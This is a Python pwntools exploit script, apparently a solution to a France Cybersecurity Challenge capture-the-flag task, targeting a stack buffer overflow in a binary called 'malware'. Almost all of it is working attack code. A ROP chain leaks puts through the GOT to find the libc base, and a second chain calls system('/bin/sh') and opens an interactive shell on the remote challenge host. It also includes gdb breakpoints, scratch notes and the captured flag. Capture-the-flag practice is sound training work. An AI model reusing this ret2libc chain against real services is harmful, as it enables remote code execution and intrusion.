#!/usr/bin/env python3

# nc challenges2.france-cybersecurity-challenge.fr 4007

from pwn import *
from Crypto.Util.number import bytes_to_long

'''
overflow in new_client
buff[129] -> read(0x400)

patch key names -> easier to debug
'''

os.system('echo FCSC{F4k3_fl44G} > /home/root/Bureau/flag.txt')

args = ['./malware', '--client', '-i', '127.0.0.1']
commands = '''
set follow-fork-mode child
# before send
b *0x402ae5
# after rec
b *0x402b18
# read flag
b *0x402bf5
# after read
b *0x402bfa
# write enc flag
b *0x402c97
c
'''
# for malware debugging as client
# r = gdb.debug(args, commands)

def leak():
    r = 0
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4007)
    else:
        r = remote('127.0.0.1', 4000)
    elf = ELF('./malware')

    got_sym = 'puts'
    plt_sym = 'puts'
    func_got = elf.got[got_sym]
    func_plt = elf.plt[plt_sym]
    exit_plt = elf.plt['exit']

    log.info(f'{got_sym}_got = {hex(func_got)}')
    log.info(f'{plt_sym}_plt = {hex(func_plt)}')

    # leak got WITH plt
    # calling convention = rdi, rsi, rdx, rcx
    pld = b''
    pld += b'a' * (0xe4 - len(pld))
    pld += p64(0) # input size
    pld += b'b' * 0xc # rbp
    pld += p64(pop_rdi) + p64(func_got)
    pld += p64(func_plt)
    pld += p64(exit_plt)
    pld += b';'

    r.send(pld)

    rec = r.recv()
    leak = bytes_to_long(rec[:-1][::-1])
    log.success(f'leak = {hex(leak)}')
    libc_base = leak - libc.sym[plt_sym]

    r.close()
    return libc_base

def exploit(libc_base):
    log.success(f'libc_base = {hex(libc_base)}')
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    log.info(f'system = {hex(system)}')
    log.info(f'binsh = {hex(binsh)}')

    r = 0
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4007)
    else:
        r = remote('127.0.0.1', 4000)

    pld = b''
    pld += b'a' * (0xe4)
    pld += p64(0) # input size
    pld += b'b' * 0xc # rbp
    pld += p64(pop_rdi) + p64(binsh)
    pld += p64(system)
    pld += b';'

    r.send(pld)
    r.interactive()


libc = ELF('./libc6_2.28-10_amd64.so')
pop_rdi = 0x403d1b # pop rdi; ret;
libc_base = leak()
exploit(libc_base)

'''
$rax   : 0x62626262
x $rbp+$rax*1-0xf0
0x800062623af2: Cannot access memory at address 0x800062623af2

echo -n 'root@kali' | sha256sum
9afbb9e2c87543a961f9a8f634af6bdf7339cc3d0955444189d1d5d4761a6a08;[rand 0:1000]

for plt in `cat elf.plt`; do echo "trying $plt"; python3 exploit.py remote $plt > $plt.out; done
'''

# FCSC{2d174930bd7772fa12360d1011be3c02ceab3fc593c3b3bf34e32384140e78ff}
